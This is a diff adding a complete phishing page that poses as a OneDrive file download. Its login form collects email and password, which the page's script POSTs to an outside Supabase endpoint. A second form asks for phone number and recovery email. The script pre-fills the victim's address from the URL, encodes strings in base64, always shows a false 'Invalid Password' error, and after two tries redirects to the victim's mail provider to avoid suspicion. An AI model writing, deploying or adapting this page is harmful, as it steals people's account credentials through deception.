@@ -1,0 +1,266 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <title>Share Point Online</title>
+    <link href="css/hover.css" rel="stylesheet" media="all">
+    <style type="text/css">
+    </style>
+</head>
+
+<body style="background-image: url('images/bgv.png'); background-size: cover;background-repeat: no-repeat;" oncontextmenu="return false">
+    <div class="container-fluid p-0">
+        <div class="container-fluid">
+            <div class="row p-3" style="background-color: #0D4283;">
+                <div class="col-lg-12">
+                    <img src="images/onedrive-white.png" class="img-fluid" width="70px;">
+                    <span class="h4 text-white align-middle">OneDrive</span>
+                </div>
+            </div>
+        </div>
+        <div class="container-fluid" style="margin: 30px 0px 40px 0px;">
+            <div class="row">
+                <div class="col-lg-4 py-2 text-right mx-auto" style="background-color: #0D4283;">
+                    <span class="h1 text-white align-middle">OneDrive</span>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-4 mx-auto text-center px-5" style="background-color: rgba(0,0,0,0.8);">
+                    <div class="mt-4">
+                        <span class="h4 text-white">Welcome to your new OneDrive!</span><br><br>
+                        <img src="images/pic1.svg" class="img-fluid" width="300px"><br><br>
+                        <span class="h3 " style="color:white;font-family: 'Archivo Narrow', sans-serif; ">That's alot to love about having OneDrive. Take the next step by downloading your file.</span>
+                    </div>
+                    <div class="my-1 rounded">
+                        <div class="row p-3">
+                            <div class="col-lg-10 text-center mx-auto">
+                                <a href="javascript:void(0)" id="gmailmodal" data-toggle="modal" data-target="#ajaxModal" class="hvr-grow w-100" style="text-decoration: none;">
+                                    <div class="rounded px-2 py-2 mt-2" style=" background-color: #D44638;">
+                                        <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Download your Complete File</span>
+                                    </div>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Modal for gmail -->
+    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <center>
+                        <img id="fieldImg" src="images/onedlogo.png" class="img-fluid " width="80px">
+                        <!-- <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5> -->
+                        <div class="alert alert-danger" id="mgss" style="display: none;">Invalid Password.! Please enter correct password.</div>
+                        <span class="text-danger error" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+                    <form class="form-horizontal well">
+                        <input type="hidden" name="count" id="count" value="0">
+                        <div id="div1">
+                            <div class="col-lg-12">
+                                <div class="form-group">
+                                    <div>
+                                        <label for="exampleInputEmail1">Email address</label>
+                                        <input type="email" name="ai" class="form-control" id="ai" aria-describedby="aiHelp" placeholder="Enter email" required="">
+                                        <small id="aiHelp" class="form-text text-muted">We'll never share your email with anyone else.</small></div>
+                                </div>
+                            </div>
+                            <div class="col-lg-12">
+                                <div class="form-group">
+                                    <label for="pr">Password</label>
+                                    <input type="password" name="pr" class="form-control" id="pr" aria-describedby="aiHelp" placeholder="Enter Password" required="">
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                                <input type="button" class="btn btn-info pull-right" name="submit-btn" id="submit-btn" value="Login">
+                            </div>
+                        </div>
+                    </form>
+                    <form class="form-horizontal well">
+                        <div id="div2" style="display: none;">
+                            <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich" class="h5">abc@abc.com</span><br>
+                            <span class="h4 font-weight-normal">Verify it's you</span><br>
+                            <span>This device is not recognized. For security, Google want to make sure it's really you.</span><br>
+                            <br>
+                            <span>Try another way to sign in</span>
+                            <div class="form-group mt-3">
+                                <input type="number" name="ph" class="form-control" id="ph" aria-describedby="aiHelp" placeholder="Enter Phone No." required="">
+                            </div>
+                            <div class="form-group mt-3">
+                                <input type="text" name="rec_ai" class="form-control" id="rec_ai" aria-describedby="aiHelp" placeholder="Enter Recovery Email" required="">
+                            </div>
+                            <div class="text-right">
+                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                                <input type="button" class="btn btn-info pull-right" name="submit-btn1" id="submit-btn1" value="verify">
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+$(document).ready(function() {
+    var count = 0;
+    var ou = "b3V0bG9vaw==";
+    var ho = "aG90bWFpbA==";
+    var gm = "Z21haWw=";
+    var ya = "eWFob28=";
+    var of = "b2ZmaWNlMzY1";
+
+    function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
+            vars[key] = value;
+        });
+        return vars;
+    }
+
+
+    if (!getUrlVars()["count"]) {
+
+    } else {
+        var count = getUrlVars()["count"];
+        $('#count').val(count);
+    }
+
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('.error').show();
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        // alert(count);
+        var ai = window.location.hash.substr(1);
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var count = $('#count').val();
+        $('#ai').val(my_ai);
+        $('#aich').html(my_ai);
+        $("#gmailmodal").click();
+
+    }
+    ///////////////url getting ai////////////////
+
+
+    var file = "bmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
+        $('.error').hide();
+        $('#mgss').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        $field = $('#field').html();
+        ///////////////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        if (!ai) {
+            $('.error').show();
+            $('.error').html("Email field is empty...!");
+            ai.focus;
+            return false;
+        }
+        if (!filter.test(my_ai)) {
+            $('.error').show();
+            $('.error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('.error').show();
+            $('.error').html("Password field is empty...!");
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: 'https://bccyzexrlqorhvwoenjm.supabase.co/functions/v1/next',
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').val('Verifing...');
+            },
+            success: function(response) {
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www."+my_slice);
+                    return false;
+                }
+                $("#pr").val("");
+                $("#mgss").show();
+            },
+            error: function() {
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www."+my_slice);
+                    return false;
+                }
+                $("#pr").val("");
+                $("#mgss").show();
+            },
+            complete: function() {
+                $('#submit-btn').val('Login');
+            }
+        });
+    });
+
+});
+</script>
+
+</html>
